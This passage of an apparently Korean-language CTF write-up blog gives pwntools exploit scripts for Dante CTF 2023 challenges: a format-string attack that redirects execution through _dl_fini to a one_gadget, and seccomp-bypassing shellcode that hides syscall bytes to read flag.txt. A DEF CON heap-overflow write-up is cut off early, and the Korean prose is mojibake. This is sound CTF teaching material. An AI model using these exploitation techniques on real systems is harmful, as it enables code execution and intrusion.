ìžˆì§€ë§Œ ìŠ¤íƒ ìƒí™©ì´ ë§žì§€ ì•Šì•„ ì›ê°€ì ¯ì€ ì‹¤í–‰ë˜ì§€ ì•Šì•˜ë‹¤. ì´ëŸ´ ë• mainì„ í•œ ë²ˆ ë” ì‹¤í–‰ì‹œì¼œ ìŠ¤íƒì— ì¡°ê¸ˆ ë³€í™”ë¥¼ ì£¼ê³ (?) ì›ê°€ì ¯ì„ ì‹¤í–‰ì‹œí‚¤ëŠ” ë°©ë²•ì´ ìžˆë‹¤.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./sentencep&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;challs.dantectf.it&#x27;,31531)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./sentencep&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;%p_%13$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_ret = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) + <span class="number">0x2148</span></span><br><span class="line">info(<span class="string">&#x27;stack_ret @ &#x27;</span> +<span class="built_in">hex</span>(stack_ret))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;_0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27; &#x27;</span>).strip(), <span class="number">16</span>) - <span class="number">0x1229</span></span><br><span class="line">info(<span class="string">&#x27;pie @ &#x27;</span> +<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">value = e.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(value))</span><br><span class="line">addr = stack_ret </span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># one more main</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;%3$p_%p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x114a37</span></span><br><span class="line">info(<span class="string">&#x27;libc.address @ &#x27;</span> +<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;_0x&#x27;</span>)</span><br><span class="line">stack_ret2 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27; &#x27;</span>).strip(), <span class="number">16</span>) + <span class="number">0x2148</span></span><br><span class="line">info(<span class="string">&#x27;stack_ret2 @ &#x27;</span> +<span class="built_in">hex</span>(stack_ret2))</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x50a37</span>, <span class="number">0xebcf1</span>, <span class="number">0xebcf5</span>, <span class="number">0xebcf8</span>]</span><br><span class="line">value = libc.address + one_gadget[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(<span class="built_in">str</span>(value)))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line">addr = stack_ret2</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit 2"></a>Exploit 2</h2><p>ì´ ë°©ë²•ì— ëŒ€í•´ì„  ê¸€ì„ ë”°ë¡œ ìž‘ì„±í•˜ë ¤ê³  í•œë‹¤. ì•„ëž˜ ìµìŠ¤í”Œë¡œìž‡ì„ ì°¸ê³ í•˜ì˜€ë‹¤.</p><ul><li><a href="https://github.com/nobodyisnobody/write-ups/tree/main/DanteCTF.2023/pwn/Sentence.To.Hell">https://github.com/nobodyisnobody/write-ups/tree/main/DanteCTF.2023/pwn/Sentence.To.Hell</a></li></ul><ol><li>stack, pie leak</li><li>stack retë¥¼ <code>_start</code>ë¡œ ë®ì–´ í•œ ë²ˆ ë” ì‹¤í–‰ë˜ë„ë¡ í•¨</li><li>libc, ld leak (í›„ì— ì•Œê³ ë³´ë‹ˆ ld leakí•œ ê°’ì´ rtldì˜€ë‹¤.)</li><li>ld_leak + 0x13b0ì„ your_nameìœ¼ë¡œ ë®ìŒ</li><li>your_nameì— íŽ˜ì´ë¡œë“œ ìž…ë ¥</li></ol><ul><li>ì›ëž˜ ld_leak + 0x13b0 ì£¼ì†Œì—ëŠ” x ê°’ì´ ì €ìž¥ë˜ì–´ ìžˆë‹¤. ê·¸ë¦¬ê³  x + 8ì— ìœ„ì¹˜í•¨ ê°’(ì£¼ì†Œ)ì´ callì´ ëœë‹¤.</li><li>ld_leak + 0x13b0 ì£¼ì†Œë¥¼ your_nameìœ¼ë¡œ ë®ì—ˆê¸° ë•Œë¬¸ì— ìµœì¢…ì ìœ¼ë¡œ your_name + 8ì— ìœ„ì¹˜í•œ ê°’(ì£¼ì†Œ)ì´ callì´ ëœë‹¤.</li><li>ì´ëŠ” ìš°ë¦¬ì˜ ìž…ë ¥ê°’ì´ë‹ˆ ì›í•˜ëŠ” ì£¼ì†Œë¥¼ callí•  ìˆ˜ ìžˆë‹¤.</li><li>ì´ë¥¼ ìœ„í•´ your_nameì— onegadgetì„, your_name+8ì—ëŠ” your_name ì£¼ì†Œë¥¼ ë„£ì–´ì•¼ í•œë‹¤.</li><li>ì‚¬ì‹¤ ìµœì¢…ì ìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” ì£¼ì†ŒëŠ” pie_base + y í˜•íƒœë¡œ ê³„ì‚°ë˜ì–´ callì´ ë˜ê³ , yëŠ” x + 8, ì¦‰ your_name + 8 ì— ìœ„ì¹˜í•œ ê°’ì´ë‹¤.</li><li>ê²°êµ­ your_nameì—ëŠ” p64(one_gadget) + p16(your_name_off) + p8(0)ì´ ë“¤ì–´ê°€ì•¼ í•œë‹¤.</li></ul><p>ì´ ë°©ë²•ì€ main í•¨ìˆ˜ê°€ ì¢…ë£Œë˜ì–´ returnë  ë•Œ <code>_dl_fini</code> í•¨ìˆ˜ì—ì„œ <code>.fini_array</code>ë¥¼ ì°¸ì¡° í›„ í˜¸ì¶œí•˜ëŠ”ë°, <code>.fini_array</code>ì„ ì–´ë–»ê²Œ ì°¸ì¡°í•˜ëŠ”ì§€ì— ì§‘ì¤‘í•˜ë©´ ì´ëŸ° ìµìŠ¤í”Œë¡œìž‡ì„ ìž‘ì„±í•  ìˆ˜ ìžˆë‹¤. your_name ë³€ìˆ˜ë¥¼ <code>.fini_array</code>ë¡œ ì°©ê°í•˜ê²Œ ë§Œë“¤ì—ˆë‹¤.</p><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./sentencep&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.dantectf.it&#x27;</span>,<span class="number">31531</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./sentencep&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;%p_%13$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_ret = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) + <span class="number">0x2148</span></span><br><span class="line">info(<span class="string">&#x27;stack_ret @ &#x27;</span> +<span class="built_in">hex</span>(stack_ret))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;_0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27; &#x27;</span>).strip(), <span class="number">16</span>) - <span class="number">0x1229</span></span><br><span class="line">info(<span class="string">&#x27;pie @ &#x27;</span> +<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">value = e.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(value))</span><br><span class="line">addr = stack_ret </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># one more main</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;%3$p_%7$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x114a37</span></span><br><span class="line">info(<span class="string">&#x27;libc.address @ &#x27;</span> +<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">ld_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27; &#x27;</span>).strip(), <span class="number">16</span>)</span><br><span class="line">ld_base = ld_leak - <span class="number">0x3a040</span></span><br><span class="line">info(<span class="string">&#x27;ld_leak @ &#x27;</span> +<span class="built_in">hex</span>(ld_leak))</span><br><span class="line">info(<span class="string">&#x27;ld_base @ &#x27;</span> +<span class="built_in">hex</span>(ld_base))</span><br><span class="line"></span><br><span class="line">value = e.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(value))</span><br><span class="line">addr = stack_ret - <span class="number">0x100</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># one more main</span></span><br><span class="line">one_gadget = [<span class="number">0x50a37</span>, <span class="number">0xebcf1</span>, <span class="number">0xebcf5</span>, <span class="number">0xebcf8</span>] <span class="comment"># one_gadget[0]ì— 0a ìžˆì–´ì„œ ì•ˆë¨</span></span><br><span class="line"><span class="comment"># your_name = libc.address + one_gadget[0] - 0x3d88 # ê¸¸ì´ê°€ ê¸¸ì–´ì„œ ìž…ë ¥ì´ ë„˜ì–´ê°</span></span><br><span class="line"></span><br><span class="line">your_name = p64(libc.address + one_gadget[<span class="number">1</span>]) + p16(<span class="number">0x4050</span>) + p8(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># print(repr(str(your_name)))</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, your_name) </span><br><span class="line"></span><br><span class="line">value = e.symbols[<span class="string">&#x27;your_name&#x27;</span>]</span><br><span class="line">addr = ld_leak + <span class="number">0x13b0</span> <span class="comment"># ld_leak = rtld</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(value))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Dante </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> Full Relro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dante CTF 2023 - Soulcode (shellcode, syscall bypass)</title>
      <link href="/230607-dantectf2023-soulcode/"/>
      <url>/230607-dantectf2023-soulcode/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2000">https://ctftime.org/event/2000</a></li></ul><blockquote><p>Before you leave the realm of the dead you must leave a message for posterity!<br>Author: GB1<br>Medium<br><code>challs.dantectf.it:31532/tcp</code></p></blockquote><ul><li>[56 solves &#x2F; 246 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ìž…ë ¥ê°’ ì‹¤í–‰ -&gt; ì‰˜ì½”ë“œ ì‹¤í–‰<br>seccomp ê±¸ë ¤ ìžˆìŒ -&gt; flag.txtë¥¼ orw í•´ì•¼í•¨</p><p>ìž…ë ¥ê°’(ì‰˜ì½”ë“œ) blacklist: 0xcd, 0x80, 0x0f, 0x05, 0x89</p><p>ì•ˆë˜ëŠ” ì–´ì…ˆë¸”ë¦¬</p><ul><li>\xcd\x80 : int 0x80</li><li>\x0f\x05 : syscall</li><li>pop, add ëª…ë ¹</li></ul><h2 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve 1"></a>Solve 1</h2><p><code>\x0f\x05</code>ì¸ syscallì„ ìš°íšŒí•˜ëŠ” ë°©ì‹ì´ë‹¤.</p><h3 id="Solve-Code"><a href="#Solve-Code" class="headerlink" title="Solve Code"></a>Solve Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./soulcode&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;challs.dantectf.it&quot;</span>, <span class="number">31532</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.global _start</span></span><br><span class="line"><span class="string">.intel_syntax noprefix</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    lea rdi, [rip+flag]</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    inc byte ptr [rip + syscall1 + 1]</span></span><br><span class="line"><span class="string">    inc byte ptr [rip + syscall1]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall1:</span></span><br><span class="line"><span class="string">    .byte 0x0e</span></span><br><span class="line"><span class="string">    .byte 0x04</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    inc byte ptr [rip + syscall2 + 1]</span></span><br><span class="line"><span class="string">    inc byte ptr [rip + syscall2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall2:</span></span><br><span class="line"><span class="string">    .byte 0x0e</span></span><br><span class="line"><span class="string">    .byte 0x04</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0x1</span></span><br><span class="line"><span class="string">    mov rax, 0x1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    inc byte ptr [rip + syscall3 + 1]</span></span><br><span class="line"><span class="string">    inc byte ptr [rip + syscall3]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall3:</span></span><br><span class="line"><span class="string">    .byte 0x0e</span></span><br><span class="line"><span class="string">    .byte 0x04</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag:</span></span><br><span class="line"><span class="string">    .string &quot;flag.txt&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode1 = asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(shellcode1))</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = run_assembly(shellcode)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!&#x27;</span>, shellcode1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve 2"></a>Solve 2</h2><p>ì•„ëž˜ëŠ” blacklist í•„í„°ë§í•˜ëŠ” í•¨ìˆ˜ì´ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">filter</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">strpbrk</span>(input, &amp;blacklist);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Ops! Not allowed char detected&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>strpbrk</code> í•¨ìˆ˜ëŠ” <code>\x00</code>ê¹Œì§€ë§Œ ê²€ì‚¬í•˜ëŠ”ë°, ì´ëŠ” ì‰˜ì½”ë“œì— <code>\x00</code>ì´ ìžˆìœ¼ë©´ ê·¸ ì „ê¹Œì§€ë§Œ ê²€ì‚¬í•˜ê³  ë’¤ì—ëŠ” ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìžˆë‹¤ëŠ” ì˜ë¯¸ì´ë‹¤. ê·¸ëž˜ì„œ êµ³ì´ syscallì„ ìš°íšŒí•˜ì§€ ì•Šê³  í‰ë²”í•˜ê²Œ í’€ì–´ë„ ëœë‹¤.</p><h3 id="Solve-Code-1"><a href="#Solve-Code-1" class="headerlink" title="Solve Code"></a>Solve Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./soulcode&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;challs.dantectf.it&quot;</span>, <span class="number">31532</span>)</span><br><span class="line"></span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.global _start</span></span><br><span class="line"><span class="string">.intel_syntax noprefix</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    lea rdi, [rip+flag]</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0x1</span></span><br><span class="line"><span class="string">    mov rax, 0x1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag:</span></span><br><span class="line"><span class="string">    .string &quot;flag.txt&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode2 = asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(shellcode2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = run_assembly(shellcode)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!&#x27;</span>, shellcode2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Dante </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DEF CON CTF Qualifier 2023 - Open House (heap)</title>
      <link href="/230602-defcon2023-open-house/"/>
      <url>/230602-defcon2023-open-house/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1871">https://ctftime.org/event/1871</a></li></ul><blockquote><p>You are cordially invited to an exclusive Open House event, where dreams meet reality and possibilities abound. Join us for an unforgettable experience as we showcase a captivating array of properties, each waiting to become your dream home.</p></blockquote><ul><li>[68 solves]</li></ul><p>Except simple UAF, my first heap challenge XD<br>(So the exploit is going to be dirty. :p)</p><p>It is very meaningful to me because I exploited the challenge using only Googling.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><img src="/images/230602-defcon2023-open-house/1.png" width=650/><br><img src="/images/230602-defcon2023-open-house/2.png" width=450/><br><p>ì´ í”„ë¡œê·¸ëž¨ì€ 4ê°€ì§€ì˜ ê¸°ëŠ¥ì„ ê°€ì§€ê³  ìžˆëŠ”ë° ëŠë‚Œìƒ ë²Œì¨ heap ë¬¸ì œ ê°™ë‹¤. (ë„¤ì´ë°ì€ ë‹¤ í•´ì¤€ ìƒíƒœì´ë‹¤.)</p><p>This program has 4 functions, and it feels like a heap challenge. (The naming has been done.)</p><p><br><br></p><p>main í•¨ìˆ˜ ì•žì—ì„œ ë§Žì´ í˜¸ì¶œëœ add() í•¨ìˆ˜ë¥¼ ì‚´íŽ´ë³´ìž. structë¥¼ ì •ì˜í•´ ì£¼ê¸° ì „ ëª¨ìŠµì€ ì •ë§ ë³µìž¡í–ˆë‹¤. ì´ í•¨ìˆ˜ë¥¼ í•´ì„í•˜ëŠ” ë° ê½¤ ì˜¤ëž˜ê±¸ë ¸ë‹¤. </p><p>Letâ€™s look at the add() function, which is called a lot before the main function. Before defining the struct, it was really complicated. I spent a lot of time interpreting this function.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">review</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> content[<span class="number">512</span>];</span><br><span class="line">  review *next;</span><br><span class="line">  review *prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/images/230602-defcon2023-open-house/3.png" width=600/><br><p>create() í•¨ìˆ˜ì—ì„œ contentë¥¼ ìž…ë ¥ë°›ê³ , ì¸ìžë¡œ í•´ì„œ ìœ„ì˜ add() í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤. ì´ë•Œ overflowëŠ” ë°œìƒí•˜ì§€ ì•ŠëŠ”ë‹¤. ì·¨ì•½ì ì€ ì•„ëž˜ modify() í•¨ìˆ˜ì—ì„œ ë‚˜íƒ€ë‚œë‹¤.</p><p>In the create() function, the content is input, and the above add() function is called with the input as a argument. In this case, overflow doesnâ€™t occur. The vulnerability appears in the modify() function below.</p><img src="/images/230602-defcon2023-open-house/4.png" width=600/><br><p>25ë²ˆì§¸ ë¼ì¸ì—ì„œ heap overflowê°€ ë°œìƒí•œë‹¤. contentë¥¼ ë„˜ì–´ì„œ nextì™€ prev í¬ì¸í„°ê¹Œì§€ ë®ì–´ì“¸ ìˆ˜ ìžˆë‹¤. </p><p>In the 25th lne, heap overflow occurs. You can overwrite the next and prev pointers beyond the content.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><ol><li>libc address êµ¬í•˜ê¸°</li></ol><ul><li>ì²˜ìŒì— 0x10~0x400ì´ í• ë‹¹ë˜ë©´ fastbinì´ë‚˜ unsorted binì— ë“¤ì–´ê°€ì§€ ì•Šê³  tcache binì— ë“¤ì–´ê°„ë‹¤.</li><li>unsorted 